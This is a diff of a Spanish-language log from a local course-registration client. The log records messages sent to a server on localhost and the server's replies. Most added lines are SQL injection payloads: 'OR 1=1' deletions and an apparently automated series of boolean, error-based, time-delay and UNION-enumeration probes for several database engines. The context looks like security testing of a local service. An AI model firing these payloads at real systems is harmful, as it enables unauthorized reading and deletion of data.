@@ -1,6 +1,1370 @@
-2012-04-08 22:20:33 -0500 Inicio bitacora 2012-04-08 22:20:33 -0500
-2012-04-08 22:20:49 -0500 127.0.0.18000
-2012-04-08 22:21:06 -0500 mensaje enviado: Insertar,9727272,Ingles,1,10
-2012-04-08 22:21:06 -0500 respuesta recibida: Tu id del registro es  34472
-2012-04-08 22:21:29 -0500 mensaje enviado: Insertar,998911,Italiano,2,11
-2012-04-08 22:21:29 -0500 respuesta recibida: Tu id del registro es  796735
+2012-05-02 17:04:30 -0500 Inicio bitacora 2012-05-02 17:04:30 -0500
+2012-05-02 17:05:03 -0500 127.0.0.18000
+2012-05-02 17:05:09 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,11
+2012-05-02 17:05:09 -0500 respuesta recibida: Tu id del registro es  780343
+2012-05-02 17:05:31 -0500 mensaje enviado: Borrar,780343 OR 1 = 1
+2012-05-02 17:05:31 -0500 respuesta recibida: Tu registro ha sido borrado
+2012-05-02 17:06:52 -0500 mensaje enviado: Insertar,A01163951,Italiano,1,10
+2012-05-02 17:06:52 -0500 respuesta recibida: Tu id del registro es  463466
+2012-05-02 17:08:22 -0500 mensaje enviado: Insertar,11111111,Chino,3,10
+2012-05-02 17:08:22 -0500 respuesta recibida: Tu id del registro es  915493
+2012-05-02 17:09:07 -0500 mensaje enviado: Borrar,915493 OR 1 = 1
+2012-05-02 17:09:07 -0500 respuesta recibida: Tu registro ha sido borrado
+2012-05-02 17:26:51 -0500 mensaje enviado: Insertar,32323,Ingles,1,10
+2012-05-02 17:26:51 -0500 respuesta recibida: Tu id del registro es  699506
+2012-05-02 17:27:05 -0500 mensaje enviado: Insertar,32323,Ingles,2,10
+2012-05-02 17:27:05 -0500 respuesta recibida: Tu id del registro es  88226
+2012-05-02 17:28:00 -0500 mensaje enviado: Insertar,00000,Ingles,2,10
+2012-05-02 17:28:00 -0500 respuesta recibida: Tu id del registro es  33366
+2012-05-02 17:28:02 -0500 mensaje enviado: Insertar,00000,Ingles,2,10
+2012-05-02 17:28:02 -0500 respuesta recibida: Tu id del registro es  177136
+2012-05-02 17:28:04 -0500 mensaje enviado: Insertar,00000,Ingles,2,10
+2012-05-02 17:28:04 -0500 respuesta recibida: Tu id del registro es  116838
+2012-05-02 17:28:05 -0500 mensaje enviado: Insertar,00000,Ingles,2,10
+2012-05-02 17:28:05 -0500 respuesta recibida: Tu id del registro es  430261
+2012-05-02 17:28:06 -0500 mensaje enviado: Insertar,00000,Ingles,2,10
+2012-05-02 17:28:06 -0500 respuesta recibida: Tu id del registro es  54885
+2012-05-02 17:28:08 -0500 mensaje enviado: Insertar,00000,Ingles,2,10
+2012-05-02 17:28:08 -0500 respuesta recibida: Tu id del registro es  754133
+2012-05-02 17:32:50 -0500 mensaje enviado: Insertar,00000,Ingles,2,10
+2012-05-02 17:32:50 -0500 respuesta recibida: Tu id del registro es  88543
+2012-05-02 19:14:08 -0500 mensaje enviado: Insertar,A01163951,Chino,2,11
+2012-05-02 19:14:08 -0500 respuesta recibida: Tu id del registro es  346217
+2012-05-02 19:14:09 -0500 mensaje enviado: Insertar,,,,
+2012-05-02 19:14:09 -0500 respuesta recibida: Tu id del registro es  964147
+2012-05-02 19:16:24 -0500 mensaje enviado: Borrar,237294 OR 1=1
+2012-05-02 19:16:24 -0500 respuesta recibida: Tu registro ha sido borrado
+2012-05-02 19:33:39 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10
+2012-05-02 19:33:39 -0500 respuesta recibida: Tu id del registro es  555177
+2012-05-02 19:33:40 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10
+2012-05-02 19:33:40 -0500 respuesta recibida: Tu id del registro es  837341
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,2676,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  419919
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951(("')'()(),Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  35
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951) AND 6874=7094 AND (5106=5106,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  365091
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951) AND 8176=8176 AND (2882=2882,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  708611
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951) AND 8493=6521 AND (8005=8005,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  546742
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951 AND 4491=8048,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  744689
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951 AND 8176=8176,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  186762
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951 AND 7181=1455,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  466573
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951') AND 5061=1343 AND ('YKSh'='YKSh,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  657489
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951') AND 8176=8176 AND ('pePt'='pePt,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  861718
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951') AND 6917=5414 AND ('ctGy'='ctGy,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  912891
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951' AND 4449=3452 AND 'tDGK'='tDGK,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  26790
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951' AND 8176=8176 AND 'dPoA'='dPoA,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  514287
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951' AND 8448=7319 AND 'xuEB'='xuEB,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  514752
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951) AND (SELECT 4221 FROM(SELECT COUNT(*),CONCAT(0x3a6d6c733a,(SELECT (CASE WHEN (4221=4221) THEN 1 ELSE 0 END)),0x3a696a673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (4411=4411,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  712801
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951 AND (SELECT 4221 FROM(SELECT COUNT(*),CONCAT(0x3a6d6c733a,(SELECT (CASE WHEN (4221=4221) THEN 1 ELSE 0 END)),0x3a696a673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a),Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  759272
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951') AND (SELECT 4221 FROM(SELECT COUNT(*),CONCAT(0x3a6d6c733a,(SELECT (CASE WHEN (4221=4221) THEN 1 ELSE 0 END)),0x3a696a673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('mExx'='mExx,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  562116
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951' AND (SELECT 4221 FROM(SELECT COUNT(*),CONCAT(0x3a6d6c733a,(SELECT (CASE WHEN (4221=4221) THEN 1 ELSE 0 END)),0x3a696a673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'vIov'='vIov,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  824143
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951) AND 7859=CAST(CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (7859=7859) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58) AS NUMERIC) AND (4512=4512,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  39541
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951 AND 7859=CAST(CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (7859=7859) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58) AS NUMERIC),Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  53640
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951') AND 7859=CAST(CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (7859=7859) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58) AS NUMERIC) AND ('FNah'='FNah,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  841450
+2012-05-02 19:34:15 -0500 mensaje enviado: Insertar,A01163951' AND 7859=CAST(CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (7859=7859) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58) AS NUMERIC) AND 'SNSJ'='SNSJ,Ingles,1,10
+2012-05-02 19:34:15 -0500 respuesta recibida: Tu id del registro es  444578
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951) AND 6708=CONVERT(INT,(CHAR(58)+CHAR(109)+CHAR(108)+CHAR(115)+CHAR(58)+(SELECT (CASE WHEN (6708=6708) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(106)+CHAR(103)+CHAR(58))) AND (4886=4886,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  591471
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951 AND 6708=CONVERT(INT,(CHAR(58)+CHAR(109)+CHAR(108)+CHAR(115)+CHAR(58)+(SELECT (CASE WHEN (6708=6708) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(106)+CHAR(103)+CHAR(58))),Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  979208
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951') AND 6708=CONVERT(INT,(CHAR(58)+CHAR(109)+CHAR(108)+CHAR(115)+CHAR(58)+(SELECT (CASE WHEN (6708=6708) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(106)+CHAR(103)+CHAR(58))) AND ('NwNh'='NwNh,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  462372
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951' AND 6708=CONVERT(INT,(CHAR(58)+CHAR(109)+CHAR(108)+CHAR(115)+CHAR(58)+(SELECT (CASE WHEN (6708=6708) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(106)+CHAR(103)+CHAR(58))) AND 'RpSy'='RpSy,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  976416
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951) AND 5065=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (5065=5065) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL) AND (3235=3235,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  158873
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951 AND 5065=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (5065=5065) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL),Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  418532
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951') AND 5065=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (5065=5065) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL) AND ('Lftq'='Lftq,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  284015
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951' AND 5065=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (5065=5065) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL) AND 'lCna'='lCna,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  869831
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951); SELECT SLEEP(5);-- ,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  804577
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951; SELECT SLEEP(5);-- ,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  470040
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951'); SELECT SLEEP(5);-- ,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  57199
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951'; SELECT SLEEP(5);-- ,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  520101
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951); SELECT PG_SLEEP(5);--,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  454829
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951; SELECT PG_SLEEP(5);--,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  486858
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951'); SELECT PG_SLEEP(5);--,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  500491
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951'; SELECT PG_SLEEP(5);--,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  825911
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951); WAITFOR DELAY '0:0:5';--,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  876531
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951; WAITFOR DELAY '0:0:5';--,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  751111
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951'); WAITFOR DELAY '0:0:5';--,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  859813
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951'; WAITFOR DELAY '0:0:5';--,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  452929
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951) AND SLEEP(5) AND (4973=4973,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  729813
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951 AND SLEEP(5),Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  698325
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951') AND SLEEP(5) AND ('jlrH'='jlrH,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  547631
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951' AND SLEEP(5) AND 'gBRI'='gBRI,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  456809
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951) AND 5465=(SELECT 5465 FROM PG_SLEEP(5)) AND (2655=2655,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  835677
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951 AND 5465=(SELECT 5465 FROM PG_SLEEP(5)),Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  877283
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951') AND 5465=(SELECT 5465 FROM PG_SLEEP(5)) AND ('rluD'='rluD,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  397615
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951' AND 5465=(SELECT 5465 FROM PG_SLEEP(5)) AND 'rdOZ'='rdOZ,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  869306
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951) WAITFOR DELAY '0:0:5'--,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  125078
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951 WAITFOR DELAY '0:0:5'--,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  435882
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951') WAITFOR DELAY '0:0:5'--,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  213227
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951' WAITFOR DELAY '0:0:5'--,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  9645
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951) AND 9272=DBMS_PIPE.RECEIVE_MESSAGE(CHR(85)||CHR(80)||CHR(65)||CHR(73),5) AND (5408=5408,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  632871
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951 AND 9272=DBMS_PIPE.RECEIVE_MESSAGE(CHR(85)||CHR(80)||CHR(65)||CHR(73),5),Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  143055
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951') AND 9272=DBMS_PIPE.RECEIVE_MESSAGE(CHR(85)||CHR(80)||CHR(65)||CHR(73),5) AND ('MSzB'='MSzB,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  814875
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951' AND 9272=DBMS_PIPE.RECEIVE_MESSAGE(CHR(85)||CHR(80)||CHR(65)||CHR(73),5) AND 'pqWd'='pqWd,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  829030
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951) ORDER BY 1#,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  694809
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951) ORDER BY 8836#,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  860105
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL#,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  139126
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  404704
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  196319
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  402752
+2012-05-02 19:34:16 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:16 -0500 respuesta recibida: Tu id del registro es  23487
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  380440
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  208621
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  619511
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  665905
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  768287
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951 ORDER BY 1#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  920037
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951 ORDER BY 3359#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  973905
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  340179
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  79129
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  61662
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  581522
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  968585
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  841644
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  294029
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  159557
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  418190
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  874147
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951') ORDER BY 1#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  521176
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951') ORDER BY 7078#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  402825
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  27257
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  713724
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  330404
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  906954
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  291333
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  350296
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  257925
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  216633
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  704053
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  796456
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951' ORDER BY 1#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  274164
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951' ORDER BY 1000#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  673030
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  9198
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  969170
+2012-05-02 19:34:17 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:17 -0500 respuesta recibida: Tu id del registro es  954694
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  163241
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  303601
+2012-05-02 19:34:18 -0500 mensaje enviado: Insertar,A01163951' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#,Ingles,1,10
+2012-05-02 19:34:18 -0500 respuesta recibida: Tu id del registro es  468928
